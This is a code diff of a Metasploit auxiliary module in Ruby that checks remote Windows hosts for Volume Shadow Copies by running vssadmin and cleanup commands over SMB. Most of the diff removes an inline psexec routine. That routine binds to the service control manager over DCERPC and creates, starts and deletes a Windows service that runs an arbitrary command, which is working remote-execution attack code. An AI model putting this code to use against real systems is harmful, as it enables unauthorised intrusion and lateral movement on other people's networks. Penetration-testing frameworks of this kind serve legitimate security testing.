@@ -119,17 +119,15 @@ class Metasploit3 < Msf::Auxiliary
 			print_status("#{ip} - Checking if a Volume Shadow Copy exists already.")
 			# Check is VSC already exists
 			prepath = '\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'
-			simple.connect(smbshare)
 			command = "%COMSPEC% /C echo vssadmin list shadows ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
-			psexec(smbshare, command)
+			result = psexec(command)
 			simple.connect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
 			outfile = simple.open(text, 'ro')
 			data = outfile.read
 			vscs = Array.new
 			simple.disconnect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
 			cleanup = "%COMSPEC% /C del /F /Q %SYSTEMDRIVE%#{text} & del /F /Q #{bat}"
-			simple.connect(smbshare)
-			psexec(smbshare, cleanup)
+			result = psexec(cleanup)
 			data.each_line { |line| vscs << line if line.include?("GLOBALROOT") }
 			if vscs.empty?
 				print_status("#{ip} - No VSC Found.")
@@ -299,142 +297,4 @@ class Metasploit3 < Msf::Auxiliary
 
 	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
 	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
-	def psexec(smbshare, command)
-		filename = "filename"
-		servicename = "servicename"
-		simple.disconnect(smbshare)
-
-		simple.connect("IPC$")
-
-		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
-		vprint_status("Binding to #{handle} ...")
-		dcerpc_bind(handle)
-		vprint_status("Bound to #{handle} ...")
-
-		vprint_status("Obtaining a service manager handle...")
-		scm_handle = nil
-		stubdata =
-			NDR.uwstring("\\\\#{rhost}") +
-			NDR.long(0) +
-			NDR.long(0xF003F)
-		begin
-			response = dcerpc.call(0x0f, stubdata)
-			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-				scm_handle = dcerpc.last_response.stub_data[0,20]
-			end
-		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
-		end
-
-		displayname = "displayname"
-		holdhandle = scm_handle
-		svc_handle  = nil
-		svc_status  = nil
-
-		stubdata =
-			scm_handle +
-			NDR.wstring(servicename) +
-			NDR.uwstring(displayname) +
-
-			NDR.long(0x0F01FF) + # Access: MAX
-			NDR.long(0x00000110) + # Type: Interactive, Own process
-			NDR.long(0x00000003) + # Start: Demand
-			NDR.long(0x00000000) + # Errors: Ignore
-			NDR.wstring( command ) +
-			NDR.long(0) + # LoadOrderGroup
-			NDR.long(0) + # Dependencies
-			NDR.long(0) + # Service Start
-			NDR.long(0) + # Password
-			NDR.long(0) + # Password
-			NDR.long(0) + # Password
-			NDR.long(0)  # Password
-		begin
-			vprint_status("Attempting to execute #{command}")
-			response = dcerpc.call(0x0c, stubdata)
-			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-				svc_handle = dcerpc.last_response.stub_data[0,20]
-				svc_status = dcerpc.last_response.stub_data[24,4]
-			end
-		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
-		end
-
-		vprint_status("Closing service handle...")
-		begin
-			response = dcerpc.call(0x0, svc_handle)
-		rescue ::Exception
-		end
-
-		vprint_status("Opening service...")
-		begin
-			stubdata =
-				scm_handle +
-				NDR.wstring(servicename) +
-				NDR.long(0xF01FF)
-
-			response = dcerpc.call(0x10, stubdata)
-			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-				svc_handle = dcerpc.last_response.stub_data[0,20]
-			end
-		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
-		end
-
-		vprint_status("Starting the service...")
-		stubdata =
-			svc_handle +
-			NDR.long(0) +
-			NDR.long(0)
-		begin
-			response = dcerpc.call(0x13, stubdata)
-			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-			end
-		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
-		end
-
-		vprint_status("Removing the service...")
-		stubdata =
-			svc_handle +
-			NDR.wstring("%WINDIR%\\Temp\\msfcommandoutput.txt")
-		begin
-			response = dcerpc.call(0x02, stubdata)
-			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-			end
-		rescue ::Exception => e
-			print_error("Error: #{e}")
-		end
-
-		vprint_status("Closing service handle...")
-		begin
-			response = dcerpc.call(0x0, svc_handle)
-		rescue ::Exception => e
-			print_error("Error: #{e}")
-		end
-
-		begin
-			#print_status("Deleting \\#{filename}...")
-			select(nil, nil, nil, 1.0)
-			#This is not really useful but will prevent double \\ on the wire :)
-		if datastore['SHARE'] =~ /.[\\\/]/
-			simple.connect(smbshare)
-			simple.delete("%WINDIR%\\Temp\\msfcommandoutput.txt")
-		else
-			simple.connect(smbshare)
-			simple.delete("%WINDIR%\\Temp\\msfcommandoutput.txt")
-		end
-
-		rescue ::Interrupt
-			raise $!
-		rescue ::Exception
-			#raise $!
-		end
-		simple.disconnect("IPC$")
-		simple.disconnect(smbshare)
-	end
-
 end
